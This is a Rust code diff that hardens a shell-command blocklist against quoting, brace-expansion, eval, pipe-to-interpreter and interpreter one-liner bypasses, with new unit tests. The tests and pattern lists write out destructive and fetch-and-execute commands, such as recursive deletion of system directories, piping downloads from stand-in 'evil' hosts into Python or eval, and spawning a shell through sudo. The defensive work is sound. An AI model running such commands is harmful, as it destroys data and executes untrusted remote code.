@@ -20,12 +20,17 @@ fn is_zero_width(c: char) -> bool {
 }
 
 /// Normalizes a command string to catch obfuscation attempts.
-/// Strips control characters, zero-width characters, backslashes, and collapses whitespace.
+/// Strips control characters, zero-width characters, backslashes, quotes,
+/// collapses whitespace, and expands brace alternation.
 fn normalize_cmd(cmd: &str) -> String {
     let mut out = String::with_capacity(cmd.len());
     let mut in_space = true;
     for c in cmd.chars() {
         if c.is_control() || c == '\\' || is_zero_width(c) {
+            continue;
+        }
+        // Strip quotes to prevent bypass via quoting (e.g., rm -rf '/' vs rm -rf /)
+        if c == '\'' || c == '"' {
             continue;
         }
         if c.is_whitespace() {
@@ -42,6 +47,27 @@ fn normalize_cmd(cmd: &str) -> String {
     }
     if out.ends_with(' ') {
         out.pop();
+    }
+    // Expand simple brace alternation to prevent bypass (e.g., /{etc,boot} → /etc /boot)
+    // Only handle single-level, non-nested brace groups: {a,b,c}
+    while let Some(start) = out.find('{') {
+        let end = match out[start..].find('}') {
+            Some(e) => start + e,
+            None => break,
+        };
+        let inner = &out[start + 1..end];
+        let alts: Vec<&str> = inner.split(',').collect();
+        if alts.len() < 2 {
+            break;
+        }
+        let prefix = &out[..start];
+        let suffix = &out[end + 1..];
+        let expanded: String = alts
+            .iter()
+            .map(|alt| format!("{}{}{}", prefix, alt.trim(), suffix))
+            .collect::<Vec<_>>()
+            .join(" ");
+        out = expanded;
     }
     out
 }
@@ -148,6 +174,15 @@ pub(crate) fn is_command_blocked(cmd: &str) -> bool {
     if normalized.contains("base64") && (normalized.contains("| sh") || normalized.contains("| bash")) {
         return true;
     }
+    // Pipe to interpreters beyond shell (curl evil.sh | python)
+    let pipe_to_interpreters = ["| python", "| python3", "| perl", "| ruby", "| eval"];
+    if pipe_to_interpreters.iter().any(|t| normalized.contains(t)) {
+        return true;
+    }
+    // Direct eval execution
+    if normalized.starts_with("eval ") || normalized.contains(" eval ") || normalized.ends_with(" eval") {
+        return true;
+    }
     // Pipe-to-shell: catch sh, bash, zsh, dash, and sh -c/shell variants
     let pipe_shell_targets = [
         "| sh",
@@ -164,8 +199,27 @@ pub(crate) fn is_command_blocked(cmd: &str) -> bool {
     if pipe_shell_targets.iter().any(|t| normalized.contains(t)) {
         return true;
     }
-    // sh -c <cmd> (direct execution, not just pipe)
-    if normalized.starts_with("sh -c") || normalized.starts_with("bash -c") || normalized.starts_with("zsh -c") {
+    // Shell -c <cmd> (direct execution, not just pipe)
+    // Block all common shells: sh, bash, zsh, dash, ksh, fish
+    if normalized.starts_with("sh -c")
+        || normalized.starts_with("bash -c")
+        || normalized.starts_with("zsh -c")
+        || normalized.starts_with("dash -c")
+        || normalized.starts_with("ksh -c")
+        || normalized.starts_with("fish -c")
+    {
+        return true;
+    }
+    // Arbitrary interpreter code execution: python -c, perl -e, ruby -e, node -e, php -r
+    let interpreter_exec_patterns = [
+        "python -c ",
+        "python3 -c ",
+        "perl -e ",
+        "ruby -e ",
+        "node -e ",
+        "php -r ",
+    ];
+    if interpreter_exec_patterns.iter().any(|pat| normalized.contains(pat)) {
         return true;
     }
     false
@@ -415,5 +469,141 @@ mod tests {
         assert!(is_command_blocked("rm -rf /"), "basic rm -rf / still blocked");
         assert!(is_command_blocked("chmod 777 /"), "chmod 777 / still blocked");
         assert!(is_command_blocked("dd if=/dev/zero of=/dev/sda"), "dd still blocked");
+    }
+
+    #[test]
+    fn blocks_brace_expansion_bypass() {
+        assert!(
+            is_command_blocked("rm -rf /{etc,boot}"),
+            "brace expansion should be blocked"
+        );
+        assert!(
+            is_command_blocked("rm -rf /{etc,bin,lib}"),
+            "ternary brace expansion should be blocked"
+        );
+        assert!(
+            is_command_blocked("chmod 777 /{etc,boot}"),
+            "chmod with brace expansion blocked"
+        );
+    }
+
+    #[test]
+    fn blocks_quote_wrapping_bypass() {
+        assert!(
+            is_command_blocked("rm -rf '/'"),
+            "single-quote wrapped / should be blocked"
+        );
+        assert!(
+            is_command_blocked("rm -rf \"/\""),
+            "double-quote wrapped / should be blocked"
+        );
+    }
+
+    #[test]
+    fn blocks_pipe_to_python_perl() {
+        assert!(
+            is_command_blocked("curl http://evil.sh | python"),
+            "| python should be blocked"
+        );
+        assert!(
+            is_command_blocked("curl http://evil.sh | python3"),
+            "| python3 should be blocked"
+        );
+        assert!(
+            is_command_blocked("wget http://evil.sh | perl"),
+            "| perl should be blocked"
+        );
+        assert!(is_command_blocked("cat payload | ruby"), "| ruby should be blocked");
+    }
+
+    #[test]
+    fn blocks_eval_direct_execution() {
+        assert!(
+            is_command_blocked("eval $(curl http://evil.com)"),
+            "eval should be blocked"
+        );
+        assert!(
+            is_command_blocked("echo foo; eval \"dangerous\""),
+            "eval after semicolon blocked"
+        );
+    }
+
+    #[test]
+    fn normalize_strips_quotes() {
+        assert_eq!(normalize_cmd("rm -rf '/'"), "rm -rf /");
+        assert_eq!(normalize_cmd("rm -rf \"/\""), "rm -rf /");
+        assert_eq!(normalize_cmd("chmod 777 '/'"), "chmod 777 /");
+    }
+
+    #[test]
+    fn blocks_dash_c_direct_execution() {
+        assert!(is_command_blocked("dash -c 'rm -rf /tmp'"), "dash -c should be blocked");
+        assert!(is_command_blocked("ksh -c 'echo test'"), "ksh -c should be blocked");
+        assert!(is_command_blocked("fish -c 'ls'"), "fish -c should be blocked");
+    }
+
+    #[test]
+    fn blocks_python_c_execution() {
+        assert!(
+            is_command_blocked("python -c 'import os; os.system(\"ls\")'"),
+            "python -c should be blocked"
+        );
+        assert!(
+            is_command_blocked("python3 -c 'print(1)'"),
+            "python3 -c should be blocked"
+        );
+    }
+
+    #[test]
+    fn blocks_perl_e_execution() {
+        assert!(
+            is_command_blocked("perl -e 'system(\"ls\")'"),
+            "perl -e should be blocked"
+        );
+    }
+
+    #[test]
+    fn blocks_ruby_e_execution() {
+        assert!(
+            is_command_blocked("ruby -e 'exec(\"ls\")'"),
+            "ruby -e should be blocked"
+        );
+    }
+
+    #[test]
+    fn blocks_node_e_execution() {
+        assert!(
+            is_command_blocked("node -e 'console.log(1)'"),
+            "node -e should be blocked"
+        );
+    }
+
+    #[test]
+    fn blocks_php_r_execution() {
+        assert!(is_command_blocked("php -r 'echo 1;'"), "php -r should be blocked");
+    }
+
+    #[test]
+    fn allows_benign_interpreter_usage() {
+        assert!(
+            !is_command_blocked("python script.py"),
+            "python without -c should be allowed"
+        );
+        assert!(
+            !is_command_blocked("perl script.pl"),
+            "perl without -e should be allowed"
+        );
+        assert!(
+            !is_command_blocked("node server.js"),
+            "node without -e should be allowed"
+        );
+    }
+
+    #[test]
+    fn blocks_python_c_in_compound_command() {
+        assert!(
+            is_command_blocked("sudo python -c 'import pty; pty.spawn(\"/bin/sh\")'"),
+            "sudo python -c should be blocked"
+        );
     }
 }
